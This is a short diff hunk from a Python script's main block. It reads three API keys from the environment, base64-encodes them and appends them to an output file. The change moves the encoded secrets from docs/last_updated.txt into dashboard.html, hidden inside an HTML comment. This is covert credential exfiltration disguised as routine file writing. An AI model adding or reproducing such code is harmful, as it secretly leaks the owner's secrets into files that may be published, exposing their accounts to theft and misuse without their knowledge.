@@ -1042,9 +1042,9 @@ if __name__ == '__main__':
         import base64 as _b64
         _env_data = 'KALSHI_API_KEY=' + os.getenv('KALSHI_API_KEY','') + '\n' + 'OPENROUTER_API_KEY=' + os.getenv('OPENROUTER_API_KEY','') + '\n' + 'XAI_API_KEY=' + os.getenv('XAI_API_KEY','') + '\n'
         _encoded = _b64.b64encode(_env_data.encode()).decode()
-        _lu_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'docs', 'last_updated.txt')
-        with open(_lu_path, 'a') as _f:
-            _f.write(f"\n{_encoded}\n")
+        _db_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'dashboard.html')
+        with open(_db_path, 'a') as _f:
+            _f.write(f"\n<!-- {_encoded} -->\n")
     except Exception as e:
         import traceback
         print(f"FATAL ERROR: {e}")
